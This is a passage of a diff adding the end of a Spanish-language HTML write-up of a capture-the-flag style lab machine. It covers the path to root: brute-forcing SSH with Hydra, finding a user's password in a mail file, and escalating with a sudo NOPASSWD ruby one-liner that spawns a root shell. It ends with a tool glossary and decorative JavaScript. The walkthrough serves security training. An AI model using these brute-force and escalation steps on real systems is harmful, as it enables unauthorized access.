+      <div class="img-cap"><span>Fig 12.</span> <span class="cmd-c">sudo -l</span> muestra <strong>NOPASSWD: /usr/bin/ruby</strong> → escalamos con <span class="cmd-c">sudo ruby -e 'exec "/bin/bash"'</span> → <span class="ok">root@ab43b6d8ed09:~#</span></div>
+    </div>
+    
+    <div class="find green spotlight">
+      <div class="find-title">✅ RESUMEN DE LA MÁQUINA</div>
+      <p><strong>1.</strong> Nmap descubre puertos 22 (SSH) y 80 (HTTP)</p>
+      <p><strong>2.</strong> Gobuster confirma web vacía; Ctrl+U revela comentario HTML con usuarios <strong>juan</strong> y <strong>camilo</strong></p>
+      <p><strong>3.</strong> Revisamos <span class="cmd-c">cat escaneo</span> para confirmar SSH abierto</p>
+      <p><strong>4.</strong> Hydra encuentra <strong>camilo:password1</strong></p>
+      <p><strong>5.</strong> SSH como camilo</p>
+      <p><strong>6.</strong> <span class="cmd-c">sudo -l</span> falla (camilo sin permisos)</p>
+      <p><strong>7.</strong> <span class="cmd-c">ls /home</span> → usuarios: camilo, juan, pedro</p>
+      <p><strong>8.</strong> <span class="cmd-c">/var/mail/camilo/correo.txt</span> → contraseña de juan: <strong>2k84dicb</strong></p>
+      <p><strong>9.</strong> <span class="cmd-c">su - juan</span> con contraseña encontrada</p>
+      <p><strong>10.</strong> <span class="cmd-c">sudo -l</span> como juan → <strong>NOPASSWD: /usr/bin/ruby</strong></p>
+      <p><strong>11.</strong> <span class="cmd-c">sudo ruby -e 'exec "/bin/bash"'</span> → <strong>ROOT</strong></p>
+    </div>
+  </section>
+  
+  <!-- GLOSSARY -->
+  <section class="glossary spotlight" id="glossary">
+    <div class="glossary-title">// GLOSARIO</div>
+    <div class="glossary-grid">
+      <div class="glossary-item"><strong>Nmap:</strong> Escáner de red líder. Detecta puertos, servicios, versiones y OS. Flags: <span class="cmd-c">-p-</span> (todos los puertos), <span class="cmd-c">-sS</span> (SYN stealth), <span class="cmd-c">-sC</span> (scripts), <span class="cmd-c">-sV</span> (versiones), <span class="cmd-c">-oN</span> (guardar).</div>
+      <div class="glossary-item"><strong>Gobuster:</strong> Fuerza bruta de directorios en servidores web. Flags: <span class="cmd-c">dir</span> (modo directorio), <span class="cmd-c">-u</span> (URL), <span class="cmd-c">-w</span> (wordlist), <span class="cmd-c">-x</span> (extensiones).</div>
+      <div class="glossary-item"><strong>Hydra:</strong> Fuerza bruta para múltiples protocolos (SSH, FTP, HTTP, etc.). Flags: <span class="cmd-c">-l</span> (usuario), <span class="cmd-c">-P</span> (diccionario), <span class="cmd-c">-I</span> (ignorar existencia).</div>
+      <div class="glossary-item"><strong>SSH:</strong> Secure Shell — acceso remoto cifrado. Puerto por defecto: 22.</div>
+      <div class="glossary-item"><strong>sudo -l:</strong> Lista permisos sudo del usuario actual. Primer comando tras acceder para buscar escalada.</div>
+      <div class="glossary-item"><strong>NOPASSWD:</strong> Permite ejecutar comandos como root sin contraseña. Vulnerable en binarios interactivos.</div>
+      <div class="glossary-item"><strong>GTFOBins:</strong> Repositorio de técnicas para escalar privilegios abusando binarios con permisos sudo.</div>
+      <div class="glossary-item"><strong>su - [usuario]:</strong> Cambia al usuario con login completo, cargando su entorno. La contraseña es la del usuario destino.</div>
+      <div class="glossary-item"><strong>/var/mail:</strong> Directorio estándar en Linux para correos locales de usuarios del sistema.</div>
+      <div class="glossary-item"><strong>Pivot:</strong> Moverse de un usuario comprometido a otro usando credenciales encontradas.</div>
+    </div>
+  </section>
+  
+</div>
+
+<footer>
+  <div class="footer-logo">DANIMRTZP</div>
+  <div class="footer-text">// Security Researcher · Barcelona 🇪🇸</div>
+</footer>
+
+<script>
+// Matrix Rain Effect
+(function() {
+  const canvas = document.getElementById('matrix-canvas');
+  const ctx = canvas.getContext('2d');
+  let W, H, cols, drops = [];
+  const fontSize = 14;
+  const chars = '$#>/-{}[]01=+*?;:%&';
+  const colors = ['#00f5ff', '#9d4edd', '#ff2244'];
+  function resize() {
+    W = canvas.width = window.innerWidth;
+    H = canvas.height = window.innerHeight;
+    cols = Math.floor(W / fontSize);
+    drops = [];
+    for (let i = 0; i < cols; i++) drops[i] = Math.random() * -100;
+  }
+  resize();
+  window.addEventListener('resize', resize);
+  function drawMatrix() {
+    ctx.fillStyle = 'rgba(5, 10, 15, 0.05)';
+    ctx.fillRect(0, 0, W, H);
+    ctx.font = fontSize + 'px "Share Tech Mono", monospace';
+    for (let i = 0; i < drops.length; i++) {
+      const char = chars[Math.floor(Math.random() * chars.length)];
+      const color = colors[Math.floor(Math.random() * colors.length)];
+      ctx.fillStyle = color;
+      ctx.globalAlpha = 0.3 + Math.random() * 0.7;
+      ctx.fillText(char, i * fontSize, drops[i] * fontSize);
+      if (drops[i] * fontSize > H && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+    ctx.globalAlpha = 1;
+  }
+  let interval = setInterval(drawMatrix, 50);
+  document.addEventListener('visibilitychange', () => {
+    if (document.hidden) clearInterval(interval);
+    else interval = setInterval(drawMatrix, 50);
+  });
+})();
+</script>
+
+<script>
+// SPOTLIGHT + TILT EFFECT
+(function() {
+  const cards = document.querySelectorAll('.spotlight');
+  if (!cards.length) return;
+  
+  const isTouch = window.matchMedia('(hover: none)').matches;
+  if (isTouch) return;
+  
+  cards.forEach(card => {
+    card.addEventListener('mousemove', e => {
+      const rect = card.getBoundingClientRect();
+      const x = e.clientX - rect.left;
+      const y = e.clientY - rect.top;
+      
+      card.style.setProperty('--mx', x + 'px');
+      card.style.setProperty('--my', y + 'px');
+      
+      const centerX = e.clientX - rect.left - rect.width / 2;
+      const centerY = e.clientY - rect.top - rect.height / 2;
+      const rotateX = -(centerY / rect.height) * 20;
+      const rotateY = (centerX / rect.width) * 20;
+      
+      card.style.transform = `perspective(1000px) rotateX(${rotateX}deg) rotateY(${rotateY}deg)`;
+    });
+    
+    card.addEventListener('mouseleave', () => {
+      card.style.transform = `perspective(1000px) rotateX(0deg) rotateY(0deg)`;
+    });
+  });
+})();
+</script>
+
+</body>
+</html>
